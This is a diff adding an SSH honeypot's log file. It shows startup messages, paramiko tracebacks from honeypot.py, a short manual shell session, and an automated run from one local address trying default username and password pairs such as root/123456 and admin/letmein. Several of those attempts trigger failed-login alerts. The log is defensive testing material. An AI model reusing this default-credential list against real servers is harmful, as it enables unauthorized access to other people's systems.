@@ -1,0 +1,686 @@
+2026-02-07 16:45:27,722 - INFO - Honeypot starter template running.
+2026-02-07 16:45:27,723 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-07 17:10:14,636 - INFO - Honeypot starter template running.
+2026-02-07 17:10:14,649 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-08 20:42:37,979 - INFO - Honeypot starter template running.
+2026-02-08 20:42:37,980 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 00:11:58,856 - INFO - Honeypot starter template running.
+2026-02-09 00:11:58,862 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 00:25:32,778 - INFO - Honeypot starter template running.
+2026-02-09 00:25:32,778 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 00:39:58,537 - INFO - Honeypot starter template running.
+2026-02-09 00:39:58,538 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 00:46:46,599 - INFO - Honeypot starter template running.
+2026-02-09 00:46:46,609 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 00:48:55,817 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 00:48:57,730 - INFO - Auth rejected (none).
+2026-02-09 00:49:05,831 - INFO - Auth granted (password).
+2026-02-09 00:53:38,508 - INFO - Honeypot starter template running.
+2026-02-09 00:53:38,513 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 00:55:06,689 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 00:55:08,220 - INFO - Auth rejected (none).
+2026-02-09 00:55:10,338 - INFO - Auth granted (password).
+2026-02-09 00:55:10,342 - ERROR - Unknown exception: 'Honeypot' object has no attribute 'event'
+2026-02-09 00:55:10,346 - ERROR - Traceback (most recent call last):
+2026-02-09 00:55:10,346 - ERROR -   File "/usr/local/lib/python3.11/site-packages/paramiko/transport.py", line 2235, in run
+2026-02-09 00:55:10,346 - ERROR -     self._channel_handler_table[ptype](chan, m)
+2026-02-09 00:55:10,347 - ERROR -   File "/usr/local/lib/python3.11/site-packages/paramiko/channel.py", line 1100, in _handle_request
+2026-02-09 00:55:10,347 - ERROR -     ok = server.check_channel_shell_request(self)
+2026-02-09 00:55:10,347 - ERROR -          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+2026-02-09 00:55:10,347 - ERROR -   File "/app/honeypot.py", line 67, in check_channel_shell_request
+2026-02-09 00:55:10,348 - ERROR -     self.event.set()
+2026-02-09 00:55:10,348 - ERROR -     ^^^^^^^^^^
+2026-02-09 00:55:10,348 - ERROR - AttributeError: 'Honeypot' object has no attribute 'event'
+2026-02-09 00:55:10,348 - ERROR - 
+2026-02-09 00:57:40,666 - INFO - Honeypot starter template running.
+2026-02-09 00:57:40,669 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 00:58:52,174 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 00:58:53,921 - INFO - Auth rejected (none).
+2026-02-09 00:58:56,728 - INFO - Auth granted (password).
+2026-02-09 00:58:56,731 - ERROR - Unknown exception: 'Honeypot' object has no attribute 'event'
+2026-02-09 00:58:56,733 - ERROR - Traceback (most recent call last):
+2026-02-09 00:58:56,733 - ERROR -   File "/usr/local/lib/python3.11/site-packages/paramiko/transport.py", line 2235, in run
+2026-02-09 00:58:56,733 - ERROR -     self._channel_handler_table[ptype](chan, m)
+2026-02-09 00:58:56,733 - ERROR -   File "/usr/local/lib/python3.11/site-packages/paramiko/channel.py", line 1100, in _handle_request
+2026-02-09 00:58:56,733 - ERROR -     ok = server.check_channel_shell_request(self)
+2026-02-09 00:58:56,733 - ERROR -          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+2026-02-09 00:58:56,733 - ERROR -   File "/app/honeypot.py", line 70, in check_channel_shell_request
+2026-02-09 00:58:56,734 - ERROR -     self.event.set()
+2026-02-09 00:58:56,734 - ERROR -     ^^^^^^^^^^
+2026-02-09 00:58:56,734 - ERROR - AttributeError: 'Honeypot' object has no attribute 'event'
+2026-02-09 00:58:56,734 - ERROR - 
+2026-02-09 01:01:22,924 - INFO - Honeypot starter template running.
+2026-02-09 01:01:22,927 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 01:02:29,803 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 01:02:31,667 - INFO - Auth rejected (none).
+2026-02-09 01:02:34,039 - INFO - Auth granted (password).
+2026-02-09 01:02:34,042 - ERROR - Unknown exception: 'Honeypot' object has no attribute 'event'
+2026-02-09 01:02:34,045 - ERROR - Traceback (most recent call last):
+2026-02-09 01:02:34,045 - ERROR -   File "/usr/local/lib/python3.11/site-packages/paramiko/transport.py", line 2235, in run
+2026-02-09 01:02:34,045 - ERROR -     self._channel_handler_table[ptype](chan, m)
+2026-02-09 01:02:34,045 - ERROR -   File "/usr/local/lib/python3.11/site-packages/paramiko/channel.py", line 1100, in _handle_request
+2026-02-09 01:02:34,045 - ERROR -     ok = server.check_channel_shell_request(self)
+2026-02-09 01:02:34,045 - ERROR -          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+2026-02-09 01:02:34,045 - ERROR -   File "/app/honeypot.py", line 71, in check_channel_shell_request
+2026-02-09 01:02:34,045 - ERROR -     self.event.set()
+2026-02-09 01:02:34,045 - ERROR -     ^^^^^^^^^^
+2026-02-09 01:02:34,045 - ERROR - AttributeError: 'Honeypot' object has no attribute 'event'
+2026-02-09 01:02:34,045 - ERROR - 
+2026-02-09 01:11:07,749 - INFO - Honeypot starter template running.
+2026-02-09 01:11:07,751 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 01:12:33,487 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 01:12:35,276 - INFO - Auth rejected (none).
+2026-02-09 01:12:37,042 - INFO - Auth granted (password).
+2026-02-09 01:12:50.374739 :: ls
+2026-02-09 01:12:55.563671 :: pwd
+2026-02-09 01:15:05.076686 :: cd /bn
+2026-02-09 01:15:09.576106 :: cd /bin
+2026-02-09 01:15:11.138311 :: ls
+2026-02-09 01:15:18.521539 :: cd /home
+2026-02-09 01:15:19.241886 :: ls
+2026-02-09 01:15:23.208670 :: cd /
+2026-02-09 01:15:24.493762 :: ls
+2026-02-09 01:15:27.943916 :: cd hoe
+2026-02-09 01:15:34.762443 :: cd /home
+2026-02-09 01:15:36.041306 :: ls
+2026-02-09 01:15:53.554857 :: cd ubuntu
+2026-02-09 01:15:58.505250 :: cd /ubuntu
+2026-02-09 01:16:03.939191 :: cd /home/ubuntu
+2026-02-09 01:16:04.654298 :: ls
+2026-02-09 01:16:09.094834 :: cat notes.txt
+2026-02-09 01:16:11.583985 :: cat
+2026-02-09 01:24:27.672082 :: exit
+2026-02-09 01:33:58,508 - INFO - Honeypot starter template running.
+2026-02-09 01:33:58,512 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 01:50:06,205 - INFO - Honeypot starter template running.
+2026-02-09 01:50:06,222 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 03:42:14,004 - INFO - Honeypot starter template running.
+2026-02-09 03:42:14,006 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 03:47:26,729 - INFO - Honeypot starter template running.
+2026-02-09 03:47:26,729 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 03:52:05,529 - INFO - Honeypot starter template running.
+2026-02-09 03:52:05,529 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 04:02:34,947 - INFO - Honeypot starter template running.
+2026-02-09 04:02:34,955 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 04:08:04,241 - INFO - Honeypot starter template running.
+2026-02-09 04:08:04,261 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 06:02:50,592 - INFO - Honeypot starter template running.
+2026-02-09 06:02:50,609 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 06:15:41,683 - INFO - Honeypot starter template running.
+2026-02-09 06:15:41,683 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 06:22:27,907 - INFO - Honeypot starter template running.
+2026-02-09 06:22:27,908 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 06:35:24,026 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=44430
+2026-02-09 06:35:24,031 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 06:35:25,686 - INFO - Auth rejected (none).
+2026-02-09 06:35:29,554 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=user pass=admin
+2026-02-09 06:35:29,554 - INFO - Auth granted (password).
+2026-02-09 06:35:29,556 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 06:35:34,215 - INFO - COMMAND source_ip=172.20.0.10 cmd="ls"
+2026-02-09 06:41:41,899 - INFO - COMMAND source_ip=172.20.0.10 cmd="exit"
+2026-02-09 06:41:41,907 - INFO - SESSION_END duration=377.88s
+2026-02-09 06:43:19,103 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=60060
+2026-02-09 06:43:19,110 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 06:43:19,126 - INFO - Auth rejected (none).
+2026-02-09 07:43:37,915 - INFO - Honeypot starter template running.
+2026-02-09 07:43:37,915 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 07:45:16,692 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=60878
+2026-02-09 07:45:16,695 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:45:16,705 - INFO - Auth rejected (none).
+2026-02-09 07:45:16,708 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=root pass=password
+2026-02-09 07:45:16,708 - INFO - Auth granted (password).
+2026-02-09 07:45:16,711 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:45:16,755 - INFO - SESSION_END duration=0.06s
+2026-02-09 07:45:17,775 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=60882
+2026-02-09 07:45:17,781 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:45:17,798 - INFO - Auth rejected (none).
+2026-02-09 07:45:17,800 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=root pass=123456
+2026-02-09 07:45:17,800 - INFO - Auth granted (password).
+2026-02-09 07:45:17,802 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:45:17,856 - INFO - SESSION_END duration=0.08s
+2026-02-09 07:45:18,887 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=60894
+2026-02-09 07:45:18,890 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:45:18,915 - INFO - Auth rejected (none).
+2026-02-09 07:45:18,916 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=root pass=admin
+2026-02-09 07:45:18,916 - INFO - Auth granted (password).
+2026-02-09 07:45:18,918 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:45:18,968 - INFO - SESSION_END duration=0.08s
+2026-02-09 07:45:19,989 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=60906
+2026-02-09 07:45:19,990 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:45:19,999 - INFO - Auth rejected (none).
+2026-02-09 07:45:20,010 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=root pass=root
+2026-02-09 07:45:20,011 - INFO - Auth granted (password).
+2026-02-09 07:45:20,012 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:51:08,956 - INFO - Honeypot starter template running.
+2026-02-09 07:51:08,956 - INFO - TODO: Implement protocol simulation, logging, and alerting.
+2026-02-09 07:51:36,103 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=42180
+2026-02-09 07:51:36,105 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:36,117 - INFO - Auth rejected (none).
+2026-02-09 07:51:36,118 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=root pass=password
+2026-02-09 07:51:36,122 - INFO - Auth granted (password).
+2026-02-09 07:51:36,137 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:51:36,182 - INFO - SESSION_END duration=0.08s
+2026-02-09 07:51:37,199 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=42182
+2026-02-09 07:51:37,200 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:37,222 - INFO - Auth rejected (none).
+2026-02-09 07:51:37,223 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=root pass=123456
+2026-02-09 07:51:37,223 - INFO - Auth granted (password).
+2026-02-09 07:51:37,236 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:51:37,248 - INFO - SESSION_END duration=0.05s
+2026-02-09 07:51:38,278 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=42196
+2026-02-09 07:51:38,286 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:38,303 - INFO - Auth rejected (none).
+2026-02-09 07:51:38,329 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=root pass=admin
+2026-02-09 07:51:38,329 - INFO - Auth granted (password).
+2026-02-09 07:51:38,334 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:51:38,351 - INFO - SESSION_END duration=0.07s
+2026-02-09 07:51:39,380 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=42210
+2026-02-09 07:51:39,381 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:39,396 - INFO - Auth rejected (none).
+2026-02-09 07:51:39,398 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=root pass=root
+2026-02-09 07:51:39,398 - INFO - Auth granted (password).
+2026-02-09 07:51:39,401 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:51:39,403 - INFO - SESSION_END duration=0.02s
+2026-02-09 07:51:40,420 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=42224
+2026-02-09 07:51:40,422 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:40,430 - INFO - Auth rejected (none).
+2026-02-09 07:51:40,432 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=root pass=letmein
+2026-02-09 07:51:40,934 - INFO - Auth rejected (password).
+2026-02-09 07:51:41,960 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=42232
+2026-02-09 07:51:41,961 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:41,985 - INFO - Auth rejected (none).
+2026-02-09 07:51:41,987 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=root pass=wrongpass
+2026-02-09 07:51:42,488 - INFO - Auth rejected (password).
+2026-02-09 07:51:43,505 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=42244
+2026-02-09 07:51:43,524 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:43,545 - INFO - Auth rejected (none).
+2026-02-09 07:51:43,560 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=password
+2026-02-09 07:51:43,568 - INFO - Auth granted (password).
+2026-02-09 07:51:43,579 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:51:43,630 - INFO - SESSION_END duration=0.12s
+2026-02-09 07:51:44,645 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=55086
+2026-02-09 07:51:44,646 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:44,655 - INFO - Auth rejected (none).
+2026-02-09 07:51:44,661 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=123456
+2026-02-09 07:51:44,666 - INFO - Auth granted (password).
+2026-02-09 07:51:44,691 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:51:44,695 - INFO - SESSION_END duration=0.05s
+2026-02-09 07:51:45,721 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=55094
+2026-02-09 07:51:45,724 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:45,731 - INFO - Auth rejected (none).
+2026-02-09 07:51:45,733 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=admin
+2026-02-09 07:51:45,733 - INFO - Auth granted (password).
+2026-02-09 07:51:45,734 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:51:45,736 - INFO - CLIENT_DISCONNECTED
+2026-02-09 07:51:45,736 - INFO - SESSION_END duration=0.02s
+2026-02-09 07:51:46,749 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=55104
+2026-02-09 07:51:46,750 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:46,757 - INFO - Auth rejected (none).
+2026-02-09 07:51:46,759 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=root
+2026-02-09 07:51:46,759 - INFO - Auth granted (password).
+2026-02-09 07:51:46,762 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:51:46,804 - INFO - SESSION_END duration=0.05s
+2026-02-09 07:51:47,852 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=55112
+2026-02-09 07:51:47,853 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:47,869 - INFO - Auth rejected (none).
+2026-02-09 07:51:47,872 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=letmein
+2026-02-09 07:51:47,873 - WARNING - ALERT multiple_failed_logins user=admin
+2026-02-09 07:51:48,373 - INFO - Auth rejected (password).
+2026-02-09 07:51:49,412 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=55114
+2026-02-09 07:51:49,413 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:49,419 - INFO - Auth rejected (none).
+2026-02-09 07:51:49,419 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=wrongpass
+2026-02-09 07:51:49,419 - WARNING - ALERT multiple_failed_logins user=admin
+2026-02-09 07:51:49,919 - INFO - Auth rejected (password).
+2026-02-09 07:51:49,924 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=
+2026-02-09 07:51:49,930 - WARNING - ALERT multiple_failed_logins user=admin
+2026-02-09 07:51:50,431 - INFO - Auth rejected (password).
+2026-02-09 07:51:50,956 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=55124
+2026-02-09 07:51:50,958 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:50,966 - INFO - Auth rejected (none).
+2026-02-09 07:51:50,968 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=ubuntu pass=password
+2026-02-09 07:51:50,969 - INFO - Auth granted (password).
+2026-02-09 07:51:50,971 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:51:51,014 - INFO - SESSION_END duration=0.06s
+2026-02-09 07:51:52,026 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=55140
+2026-02-09 07:51:52,027 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:52,036 - INFO - Auth rejected (none).
+2026-02-09 07:51:52,037 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=ubuntu pass=123456
+2026-02-09 07:51:52,038 - INFO - Auth granted (password).
+2026-02-09 07:51:52,040 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:51:52,083 - INFO - SESSION_END duration=0.06s
+2026-02-09 07:51:53,096 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=55148
+2026-02-09 07:51:53,097 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:53,105 - INFO - Auth rejected (none).
+2026-02-09 07:51:53,106 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=ubuntu pass=admin
+2026-02-09 07:51:53,106 - INFO - Auth granted (password).
+2026-02-09 07:51:53,108 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:51:53,159 - INFO - SESSION_END duration=0.06s
+2026-02-09 07:51:54,179 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=44046
+2026-02-09 07:51:54,181 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:54,207 - INFO - Auth rejected (none).
+2026-02-09 07:51:54,210 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=ubuntu pass=root
+2026-02-09 07:51:54,210 - INFO - Auth granted (password).
+2026-02-09 07:51:54,211 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:51:54,258 - INFO - SESSION_END duration=0.08s
+2026-02-09 07:51:55,281 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=44062
+2026-02-09 07:51:55,282 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:55,305 - INFO - Auth rejected (none).
+2026-02-09 07:51:55,307 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=ubuntu pass=letmein
+2026-02-09 07:51:55,307 - WARNING - ALERT multiple_failed_logins user=ubuntu
+2026-02-09 07:51:55,809 - INFO - Auth rejected (password).
+2026-02-09 07:51:56,824 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=44072
+2026-02-09 07:51:56,827 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:56,837 - INFO - Auth rejected (none).
+2026-02-09 07:51:56,840 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=ubuntu pass=wrongpass
+2026-02-09 07:51:56,840 - WARNING - ALERT multiple_failed_logins user=ubuntu
+2026-02-09 07:51:57,341 - INFO - Auth rejected (password).
+2026-02-09 07:51:58,361 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=44078
+2026-02-09 07:51:58,364 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:58,371 - INFO - Auth rejected (none).
+2026-02-09 07:51:58,373 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=test pass=password
+2026-02-09 07:51:58,373 - INFO - Auth granted (password).
+2026-02-09 07:51:58,375 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:51:58,418 - INFO - SESSION_END duration=0.05s
+2026-02-09 07:51:59,449 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=44084
+2026-02-09 07:51:59,450 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:51:59,459 - INFO - Auth rejected (none).
+2026-02-09 07:51:59,461 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=test pass=123456
+2026-02-09 07:51:59,462 - INFO - Auth granted (password).
+2026-02-09 07:51:59,468 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:51:59,515 - INFO - SESSION_END duration=0.07s
+2026-02-09 07:52:00,527 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=44100
+2026-02-09 07:52:00,529 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:52:00,537 - INFO - Auth rejected (none).
+2026-02-09 07:52:00,539 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=test pass=admin
+2026-02-09 07:52:00,540 - INFO - Auth granted (password).
+2026-02-09 07:52:00,541 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:52:00,584 - INFO - SESSION_END duration=0.06s
+2026-02-09 07:52:01,602 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=44104
+2026-02-09 07:52:01,603 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:52:01,612 - INFO - Auth rejected (none).
+2026-02-09 07:52:01,613 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=test pass=root
+2026-02-09 07:52:01,613 - INFO - Auth granted (password).
+2026-02-09 07:52:01,626 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:52:01,628 - INFO - SESSION_END duration=0.03s
+2026-02-09 07:52:02,644 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=44108
+2026-02-09 07:52:02,644 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:52:02,655 - INFO - Auth rejected (none).
+2026-02-09 07:52:02,657 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=test pass=letmein
+2026-02-09 07:52:02,657 - WARNING - ALERT multiple_failed_logins user=test
+2026-02-09 07:52:03,158 - INFO - Auth rejected (password).
+2026-02-09 07:52:04,188 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=58900
+2026-02-09 07:52:04,189 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:52:04,196 - INFO - Auth rejected (none).
+2026-02-09 07:52:04,197 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=test pass=wrongpass
+2026-02-09 07:52:04,197 - WARNING - ALERT multiple_failed_logins user=test
+2026-02-09 07:52:04,700 - INFO - Auth rejected (password).
+2026-02-09 07:52:05,715 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=58902
+2026-02-09 07:52:05,716 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:52:05,723 - INFO - Auth rejected (none).
+2026-02-09 07:52:05,725 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=nobody pass=password
+2026-02-09 07:52:05,725 - WARNING - ALERT multiple_failed_logins user=nobody
+2026-02-09 07:52:06,226 - INFO - Auth rejected (password).
+2026-02-09 07:52:06,227 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=nobody pass=
+2026-02-09 07:52:06,228 - WARNING - ALERT multiple_failed_logins user=nobody
+2026-02-09 07:52:06,729 - INFO - Auth rejected (password).
+2026-02-09 07:52:07,253 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=58918
+2026-02-09 07:52:07,255 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:52:07,289 - INFO - Auth rejected (none).
+2026-02-09 07:52:07,291 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=nobody pass=123456
+2026-02-09 07:52:07,291 - WARNING - ALERT multiple_failed_logins user=nobody
+2026-02-09 07:52:07,792 - INFO - Auth rejected (password).
+2026-02-09 07:52:08,808 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=58926
+2026-02-09 07:52:08,815 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:52:08,859 - INFO - Auth rejected (none).
+2026-02-09 07:52:08,861 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=nobody pass=admin
+2026-02-09 07:52:08,862 - WARNING - ALERT multiple_failed_logins user=nobody
+2026-02-09 07:52:09,363 - INFO - Auth rejected (password).
+2026-02-09 07:52:10,384 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=58928
+2026-02-09 07:52:10,386 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:52:10,410 - INFO - Auth rejected (none).
+2026-02-09 07:52:10,422 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=nobody pass=root
+2026-02-09 07:52:10,427 - WARNING - ALERT multiple_failed_logins user=nobody
+2026-02-09 07:52:10,928 - INFO - Auth rejected (password).
+2026-02-09 07:52:11,944 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=58940
+2026-02-09 07:52:11,944 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:52:11,952 - INFO - Auth rejected (none).
+2026-02-09 07:52:11,954 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=nobody pass=letmein
+2026-02-09 07:52:11,954 - WARNING - ALERT multiple_failed_logins user=nobody
+2026-02-09 07:52:12,455 - INFO - Auth rejected (password).
+2026-02-09 07:52:12,465 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=nobody pass=
+2026-02-09 07:52:12,465 - WARNING - ALERT multiple_failed_logins user=nobody
+2026-02-09 07:52:12,970 - INFO - Auth rejected (password).
+2026-02-09 07:52:13,479 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=58952
+2026-02-09 07:52:13,481 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:52:13,488 - INFO - Auth rejected (none).
+2026-02-09 07:52:13,490 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=nobody pass=wrongpass
+2026-02-09 07:52:13,490 - WARNING - ALERT multiple_failed_logins user=nobody
+2026-02-09 07:52:13,993 - INFO - Auth rejected (password).
+2026-02-09 07:54:13,057 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=50446
+2026-02-09 07:54:13,060 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:13,085 - INFO - Auth rejected (none).
+2026-02-09 07:54:13,086 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=root pass=password
+2026-02-09 07:54:13,087 - INFO - Auth granted (password).
+2026-02-09 07:54:13,098 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:13,146 - INFO - SESSION_END duration=0.09s
+2026-02-09 07:54:14,166 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=59040
+2026-02-09 07:54:14,169 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:14,203 - INFO - Auth rejected (none).
